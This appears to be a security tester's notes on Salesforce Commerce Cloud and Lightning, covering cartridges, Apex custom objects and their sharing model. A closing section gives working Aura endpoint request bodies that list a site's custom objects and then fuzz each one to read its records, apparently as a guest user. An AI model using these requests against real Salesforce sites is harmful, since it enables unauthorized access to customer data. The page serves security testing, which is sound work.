# Commerce Cloud

> [!summary]
> Commerce Cloud is an ecommerce platform from Salesforce. It is comprised of [Salesforce B2C Commerce](https://www.salesforce.com/eu/products/commerce-cloud/ecommerce/) and [Salesforce B2B Commerce](https://www.salesforce.com/eu/products/commerce-cloud/b2b-ecommerce/) which are often used together to deliver end to end unified commerce.

Salesforce AppExchange gives developers the power to customize applications with "**cartridges**", available to anyone and developed by anyone.
Cartridges are mechanisms for packing and deploying program code and data

# Lightning

> [!summary]
> Salesforce Lightning is a component-based framework for Salesforce app development.
> Usually sites build with Lightning uses one of the following URLs:
> - \*.force.com
> - \*.secure.force.com
> - \*.live.siteforce.com

Lightning leverages **Apex objects**:
- some are available by **Default** and secured by SalesForce
- others are **Custom Objects** (identified by the `_c` in their name, like `level_c`)

Custom Objects have a very complex sharing model:
- CRUDS
- Groups
- Sharing Rules
- Owner \[+Manual\] \[+Territory\] \[+Role\] 
- etc.

APEX Objects are similar to Java Objects: you can create classes (as templates) from which objects are instantiated.

In Lightning there is no actual administrator but there are specific groups created to perform privileged/restricted actions.
This is for ease of permissions but this is where custom objects become an issue.

## Pulling custom objects

1. Search HTTP request sent to AURA (from a guest user or an authenticated)
	- Eg. `POST /s/sites/aura?r=...`
2. Manipulate the JSON body and send the desired data:
	- `id`: random string used to identified multiple actions in the same request
	- `descriptor`: specific method to call
	- `callingDescriptor`: usually "UNKNOWN" since it is often ignored
	- `params`: parameters provided to the method

List all the custom objects:
```json
{
	"actions":[
		{
		"id":"123;a",
		"descriptor":"serviceComponent://ui.force.components.controllers.hostConfigController/ACTION$getConfigData",
		"callingDescriptor":"UNKNOWN",
		"params":{}
		}
	]
}
```

Query every object:
```json
{
	"actions":[
		{
		"id":"123;a",
		"descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems",
		"callingDescriptor":"UNKNOWN",
		"params":{"entityNameOrId":"NYC_Marketing_Preference__c"} // Fuzz the entityNameOrId with the various custom objects retreived before
		
		}
	]
}
```